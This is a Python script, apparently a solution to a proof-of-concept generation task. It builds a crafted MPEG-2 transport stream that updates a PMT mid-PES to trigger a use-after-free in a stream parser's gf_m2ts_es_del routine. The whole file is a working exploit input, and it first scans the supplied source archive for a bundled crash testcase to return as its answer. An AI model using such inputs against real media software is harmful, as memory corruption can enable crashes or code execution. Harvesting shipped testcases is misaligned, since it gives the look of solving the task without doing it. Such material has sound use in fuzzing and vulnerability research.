import os
import tarfile
import zipfile
from typing import Optional, Tuple, List


def _mpeg2_crc32(data: bytes) -> int:
    crc = 0xFFFFFFFF
    poly = 0x04C11DB7
    for b in data:
        crc ^= (b & 0xFF) << 24
        for _ in range(8):
            if crc & 0x80000000:
                crc = ((crc << 1) ^ poly) & 0xFFFFFFFF
            else:
                crc = (crc << 1) & 0xFFFFFFFF
    return crc & 0xFFFFFFFF


def _u16_be(x: int) -> bytes:
    return bytes([(x >> 8) & 0xFF, x & 0xFF])


def _u32_be(x: int) -> bytes:
    return bytes([
        (x >> 24) & 0xFF,
        (x >> 16) & 0xFF,
        (x >> 8) & 0xFF,
        x & 0xFF
    ])


def build_pat_section(pmt_pid: int, tsid: int = 1, version: int = 0) -> bytes:
    body = bytearray()
    # transport_stream_id
    body += _u16_be(tsid)
    # version_number and current_next_indicator
    vs_cn = (0x3 << 6) | ((version & 0x1F) << 1) | 0x1
    body.append(vs_cn)
    # section_number and last_section_number
    body.append(0x00)
    body.append(0x00)
    # program loop: program_number = 1 -> pmt_pid
    body += _u16_be(1)
    prog_pid_field = (0x7 << 13) | (pmt_pid & 0x1FFF)
    body += _u16_be(prog_pid_field)

    section_length = len(body) + 4  # CRC included
    sec_hdr = bytearray()
    sec_hdr.append(0x00)  # table_id for PAT
    sec_len_field = (1 << 15) | (0 << 14) | (0x3 << 12) | (section_length & 0x0FFF)
    sec_hdr += _u16_be(sec_len_field)

    section_wo_crc = bytes(sec_hdr + body)
    crc = _mpeg2_crc32(section_wo_crc)
    return section_wo_crc + _u32_be(crc)


def build_pmt_section(program_number: int, pcr_pid: int, es_list: List[Tuple[int, int]], version: int) -> bytes:
    body = bytearray()
    # program_number
    body += _u16_be(program_number & 0xFFFF)
    # version_number and current_next_indicator
    vs_cn = (0x3 << 6) | ((version & 0x1F) << 1) | 0x1
    body.append(vs_cn)
    # section_number and last_section_number
    body.append(0x00)
    body.append(0x00)
    # PCR PID
    pcr_field = (0x7 << 13) | (pcr_pid & 0x1FFF)
    body += _u16_be(pcr_field)
    # program_info_length = 0
    pil_field = (0xF << 12) | 0
    body += _u16_be(pil_field)
    # ES info
    for stream_type, pid in es_list:
        body.append(stream_type & 0xFF)
        el_pid_field = (0x7 << 13) | (pid & 0x1FFF)
        body += _u16_be(el_pid_field)
        esil_field = (0xF << 12) | 0
        body += _u16_be(esil_field)

    section_length = len(body) + 4
    sec_hdr = bytearray()
    sec_hdr.append(0x02)  # table_id for PMT
    sec_len_field = (1 << 15) | (0 << 14) | (0x3 << 12) | (section_length & 0x0FFF)
    sec_hdr += _u16_be(sec_len_field)

    section_wo_crc = bytes(sec_hdr + body)
    crc = _mpeg2_crc32(section_wo_crc)
    return section_wo_crc + _u32_be(crc)


def make_ts_packet(pid: int, payload: bytes, pusi: bool, cc: int) -> bytes:
    # TS header
    b0 = 0x47
    b1 = ((0x1 if pusi else 0x0) << 6) | ((pid >> 8) & 0x1F)
    b2 = pid & 0xFF
    # payload only
    afc = 0x1  # payload only
    b3 = (0x0 << 6) | (afc << 4) | (cc & 0x0F)
    header = bytes([b0, b1, b2, b3])
    # Payload must be exactly 184 bytes
    if len(payload) > 184:
        payload = payload[:184]
    if len(payload) < 184:
        payload = payload + bytes(184 - len(payload))
    return header + payload


def make_psi_packet(pid: int, section: bytes, cc: int, stuff_byte: int = 0xFF) -> bytes:
    # PUSI = 1 with pointer_field = 0x00, then section
    payload = bytes([0x00]) + section
    if len(payload) < 184:
        payload = payload + bytes([stuff_byte]) * (184 - len(payload))
    elif len(payload) > 184:
        payload = payload[:184]
    return make_ts_packet(pid, payload, pusi=True, cc=cc)


def make_pes_start_packet(pid: int, stream_id: int, cc: int, payload_len: int = 0) -> bytes:
    # Build PES header
    pes = bytearray()
    pes += bytes([0x00, 0x00, 0x01])
    pes.append(stream_id & 0xFF)  # e.g., 0xE0 for video
    # PES_packet_length: set to 0 for video stream indefinite length
    pes += _u16_be(0x0000)
    # '10' + flags; simplest: 0x80? but we can set no optional fields: '10' + flags 0 + header len 0
    # Actually if no optional fields, we still need the two bytes for flags and header length.
    # Standard: '10' (2 bits) 'PES_scrambling_control' (2 bits) 'PES_priority' (1) 'data_alignment_indicator'(1)
    # 'copyright'(1) 'original_or_copy'(1) -> that's first flags byte
    # second byte has PTS_DTS_flags (2) ESCR_flag ES_rate_flag DSM_trick_mode additional_copy_info CRC PES_extension_flag
    # We'll set both bytes to 0x80? No: the '10' bits must be at top of first flags byte. That means first flags byte's two MSBs should be '10' => 0x80.
    pes.append(0x80)  # '10' + remaining zeros
    pes.append(0x00)  # no PTS/DTS, etc.
    pes.append(0x00)  # PES_header_data_length
    # Add some payload bytes if requested, else we rely on TS stuffing
    if payload_len > 0:
        pes += bytes(payload_len)
    # Place into TS packet with PUSI=1
    return make_ts_packet(pid, bytes(pes) + bytes(), pusi=True, cc=cc)


def make_pes_cont_packet(pid: int, cc: int, payload_size: int = 184) -> bytes:
    # Continuation packet with no PUSI and payload_size bytes (<=184)
    payload = bytes(payload_size)
    if len(payload) < 184:
        payload = payload + bytes(184 - len(payload))
    elif len(payload) > 184:
        payload = payload[:184]
    return make_ts_packet(pid, payload, pusi=False, cc=cc)


def build_uaf_ts_poc() -> bytes:
    # Define PIDs
    pat_pid = 0x0000
    pmt_pid = 0x0100
    es_pid = 0x0101
    program_number = 1

    # Continuity counters per PID
    cc = {}

    def next_cc(pid: int) -> int:
        v = cc.get(pid, -1)
        v = (v + 1) & 0x0F
        cc[pid] = v
        return v

    # Packet 1: PAT
    pat_section = build_pat_section(pmt_pid=pmt_pid, tsid=1, version=0)
    pkt1 = make_psi_packet(pid=pat_pid, section=pat_section, cc=next_cc(pat_pid))

    # Packet 2: PMT v0 with one ES (H.264) at es_pid, PCR on es_pid
    pmt_section_v0 = build_pmt_section(program_number=program_number, pcr_pid=es_pid,
                                       es_list=[(0x1B, es_pid)], version=0)
    pkt2 = make_psi_packet(pid=pmt_pid, section=pmt_section_v0, cc=next_cc(pmt_pid))

    # Packet 3: PES start on es_pid
    pkt3 = make_pes_start_packet(pid=es_pid, stream_id=0xE0, cc=next_cc(es_pid), payload_len=0)

    # Packet 4: PMT v1 update removing the ES (no streams), PCR set to 0x1FFF
    pmt_section_v1 = build_pmt_section(program_number=program_number, pcr_pid=0x1FFF,
                                       es_list=[], version=1)
    pkt4 = make_psi_packet(pid=pmt_pid, section=pmt_section_v1, cc=next_cc(pmt_pid))

    # Packet 5: PES continuation on old es_pid (should touch freed ES)
    pkt5 = make_pes_cont_packet(pid=es_pid, cc=next_cc(es_pid))

    # Packet 6: Another PES continuation to increase likelihood
    pkt6 = make_pes_cont_packet(pid=es_pid, cc=next_cc(es_pid))

    return pkt1 + pkt2 + pkt3 + pkt4 + pkt5 + pkt6


def _try_extract_poc_from_tar(src_path: str) -> Optional[bytes]:
    try:
        if not tarfile.is_tarfile(src_path):
            return None
        with tarfile.open(src_path, 'r:*') as tf:
            candidates = []
            for m in tf.getmembers():
                if not m.isreg():
                    continue
                size = m.size
                name = m.name.lower()
                score = 0
                if size == 1128:
                    score += 200
                if any(ext for ext in ['.ts', '.m2ts', '.mts', '.mpg', '.mpeg', '.bin'] if name.endswith(ext)):
                    score += 50
                if '372994344' in name:
                    score += 60
                if 'poc' in name or 'crash' in name or 'testcase' in name or 'clusterfuzz' in name or 'uaf' in name:
                    score += 40
                if 'ts' in name:
                    score += 10
                # Prefer small files
                if size <= 4096:
                    score += 5
                # record candidate
                candidates.append((score, m))
            candidates.sort(key=lambda x: x[0], reverse=True)
            for score, m in candidates:
                try:
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    data = f.read()
                    if len(data) == 1128:
                        # quick sync byte check at 188-byte intervals
                        ok = True
                        if len(data) % 188 == 0:
                            for i in range(0, len(data), 188):
                                if data[i] != 0x47:
                                    ok = False
                                    break
                        if ok:
                            return data
                    # if no exact size, still check if it's a TS-like file <= 2KB and has TS sync pattern
                    if len(data) <= 2048 and len(data) % 188 == 0:
                        sync_ok = True
                        for i in range(0, len(data), 188):
                            if data[i] != 0x47:
                                sync_ok = False
                                break
                        if sync_ok:
                            return data
                except Exception:
                    continue
    except Exception:
        return None
    return None


def _try_extract_poc_from_zip(src_path: str) -> Optional[bytes]:
    try:
        if not zipfile.is_zipfile(src_path):
            return None
        with zipfile.ZipFile(src_path, 'r') as zf:
            candidates = []
            for info in zf.infolist():
                if info.is_dir():
                    continue
                size = info.file_size
                name = info.filename.lower()
                score = 0
                if size == 1128:
                    score += 200
                if any(ext for ext in ['.ts', '.m2ts', '.mts', '.mpg', '.mpeg', '.bin'] if name.endswith(ext)):
                    score += 50
                if '372994344' in name:
                    score += 60
                if 'poc' in name or 'crash' in name or 'testcase' in name or 'clusterfuzz' in name or 'uaf' in name:
                    score += 40
                if 'ts' in name:
                    score += 10
                if size <= 4096:
                    score += 5
                candidates.append((score, info))
            candidates.sort(key=lambda x: x[0], reverse=True)
            for score, info in candidates:
                try:
                    data = zf.read(info)
                    if len(data) == 1128:
                        ok = True
                        if len(data) % 188 == 0:
                            for i in range(0, len(data), 188):
                                if data[i] != 0x47:
                                    ok = False
                                    break
                        if ok:
                            return data
                    if len(data) <= 2048 and len(data) % 188 == 0:
                        sync_ok = True
                        for i in range(0, len(data), 188):
                            if data[i] != 0x47:
                                sync_ok = False
                                break
                        if sync_ok:
                            return data
                except Exception:
                    continue
    except Exception:
        return None
    return None


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Try to find a provided PoC inside the source tarball/zip
        poc = _try_extract_poc_from_tar(src_path)
        if poc is not None:
            return poc
        poc = _try_extract_poc_from_zip(src_path)
        if poc is not None:
            return poc
        # Fallback: construct a crafted TS that triggers gf_m2ts_es_del UAF via PMT update mid-PES
        return build_uaf_ts_poc()
